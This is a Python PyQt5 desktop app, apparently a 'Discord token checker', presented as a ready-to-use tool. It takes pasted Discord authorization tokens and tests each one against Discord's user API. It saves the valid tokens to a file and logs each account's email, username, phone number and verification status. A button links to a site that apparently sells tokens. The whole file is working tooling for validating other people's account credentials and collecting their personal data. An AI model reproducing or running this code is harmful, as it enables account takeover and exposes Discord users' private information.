# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'checker.ui'
#
# Created by: PyQt5 UI code generator 5.14.1
#
# WARNING! All changes made in this file will be lost!


from PyQt5 import QtCore, QtGui, QtWidgets
import requests as req
import webbrowser
if hasattr(QtCore.Qt, 'AA_EnableHighDpiScaling'):
    QtWidgets.QApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling, True)

if hasattr(QtCore.Qt, 'AA_UseHighDpiPixmaps'):
    QtWidgets.QApplication.setAttribute(QtCore.Qt.AA_UseHighDpiPixmaps, True)
class Ui_SecondForm(object):
    def setupUi(self, SecondForm):
        SecondForm.setObjectName("SecondForm")
        SecondForm.resize(646, 480)
        SecondForm.setMaximumSize(646,480)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Fixed, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(SecondForm.sizePolicy().hasHeightForWidth())
        SecondForm.setSizePolicy(sizePolicy)
        SecondForm.setStyleSheet("background-color: rgb(22, 23, 29)")
        self.plainTextEdit = QtWidgets.QPlainTextEdit(SecondForm)
        self.plainTextEdit.setGeometry(QtCore.QRect(0, 0, 640, 480))
        self.plainTextEdit.setStyleSheet("color:rgba(121, 123, 241, 1)")
        self.plainTextEdit.setObjectName("QPlainTextEdit")

        self.retranslateUi(SecondForm)
        QtCore.QMetaObject.connectSlotsByName(SecondForm)

    def retranslateUi(self, SecondForm):
        _translate = QtCore.QCoreApplication.translate
        SecondForm.setWindowTitle(_translate("SecondForm", "Debug"))
class Ui_Form(object):
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(576, 450)
        Form.setAutoFillBackground(False)
        Form.setStyleSheet("background-color: rgb(22, 23, 29)")
        Form.setMaximumSize(576,450)
        self.pushButton = QtWidgets.QPushButton(Form)
        self.pushButton.setGeometry(QtCore.QRect(10, 370, 113, 32))
        self.pushButton.setStyleSheet("background:rgba(121, 123, 241, 1)")
        self.pushButton.setObjectName("pushButton")
        self.label = QtWidgets.QLabel(Form)
        self.label.setGeometry(QtCore.QRect(30, 20, 510, 60))
        font = QtGui.QFont()
        font.setFamily("Geometos")
        font.setPointSize(60)
        font.setBold(False)
        font.setWeight(50)
        font.setStyleStrategy(QtGui.QFont.PreferDefault)
        self.label.setFont(font)
        self.label.setAutoFillBackground(False)
        self.label.setStyleSheet("color:rgba(121, 123, 241, 1)")
        self.label.setObjectName("label")
        self.plainTextEdit = QtWidgets.QPlainTextEdit(Form)
        self.plainTextEdit.setGeometry(QtCore.QRect(30, 90, 510, 261))
        self.plainTextEdit.setStyleSheet("color:rgba(121, 123, 241, 1)")
        self.plainTextEdit.setObjectName("plainTextEdit")
        self.label_2 = QtWidgets.QLabel(Form)
        self.label_2.setGeometry(QtCore.QRect(470, 430, 101, 16))
        self.label_2.setStyleSheet("color:rgba(121, 123, 241, 1)")
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(Form)
        self.label_3.setGeometry(QtCore.QRect(130, 370, 60, 16))
        self.label_3.setStyleSheet("color:rgb(51, 255, 0)")
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(Form)
        self.label_4.setGeometry(QtCore.QRect(130, 390, 60, 16))
        self.label_4.setStyleSheet("color:rgb(255, 0, 0)")
        self.label_4.setObjectName("label_4")
        self.label_5 = QtWidgets.QLabel(Form)
        self.label_5.setGeometry(QtCore.QRect(200, 370, 41, 16))
        self.label_5.setStyleSheet("color:rgb(102, 255, 0)")
        self.label_5.setObjectName("label_5")
        self.label_6 = QtWidgets.QLabel(Form)
        self.label_6.setGeometry(QtCore.QRect(200, 390, 60, 16))
        self.label_6.setStyleSheet("color:rgb(255, 0, 0)")
        self.label_6.setObjectName("label_6")
        self.pushButton_2 = QtWidgets.QPushButton(Form)
        self.pushButton_2.setGeometry(QtCore.QRect(10, 410, 113, 32))
        self.pushButton_2.setStyleSheet("background:rgba(121, 123, 241, 1)")
        self.pushButton_2.setObjectName("pushButton_2")
        self.checkBox = QtWidgets.QCheckBox(Form)
        self.checkBox.setGeometry(QtCore.QRect(130, 420, 87, 20))
        self.checkBox.setStyleSheet("color:rgba(121, 123, 241, 1)")
        self.checkBox.setObjectName("checkBox")

        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "DiscordToken.xyz Checker"))
        self.pushButton.setText(_translate("Form", "Check"))
        self.pushButton.clicked.connect(self.read_tokens)
        self.label.setText(_translate("Form", "DISCORDTOKEN"))
        self.label_2.setText(_translate("Form", "v0.1 by RusTNT"))
        self.label_3.setText(_translate("Form", "Valide:"))
        self.label_4.setText(_translate("Form", "Disabled:"))
        self.label_5.setText(_translate("Form", "0"))
        self.label_6.setText(_translate("Form", "0"))
        self.pushButton_2.setText(_translate("Form", "Buy tokens"))
        self.pushButton_2.clicked.connect(self.buy_tokens)
        self.checkBox.setText(_translate("Form", "Debug"))
    def read_tokens(self):
        try:
             _translate = QtCore.QCoreApplication.translate
             if self.checkBox.isChecked():
                 SecondForm.show()
             else:
                 SecondForm.hide()
             tokens = self.plainTextEdit.toPlainText().split('\n')
             s = req.Session()
             f = open('valide.txt', 'w')
             v=0
             d=0
             for token in tokens:
                 try:
                     s.headers.update({'authorization': token})
                     check_token = s.get('https://discordapp.com/api/v6/users/@me', timeout=5)
                     if check_token.status_code == 401:
                         secondui.plainTextEdit.appendPlainText(_translate("lol", "%s was disabled \n" % token ))
                         d+=1
                         self.label_6.setText(_translate("Form", "%s" % d))

                     else:
                         if check_token.status_code == 200:
                             f.write("%s" % token + '\n')
                             ct = check_token.json()
                             secondui.plainTextEdit.appendPlainText(_translate("lol", "%s | %s | %s | %s | Verify %s \n" % (token, ct['email'], ct['username'], ct['phone'], ct['verified'])))
                             v+=1
                             self.label_5.setText(_translate("Form", "%s" % v))
                 except:
                    continue
             f.close()
        except:
            return
    def buy_tokens(self):
        webbrowser.open('https://discordtoken.xyz')



if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    Form = QtWidgets.QWidget()
    SecondForm = QtWidgets.QWidget()
    ui = Ui_Form()
    secondui = Ui_SecondForm()
    ui.setupUi(Form)
    secondui.setupUi(SecondForm)
    Form.show()
    sys.exit(app.exec_())
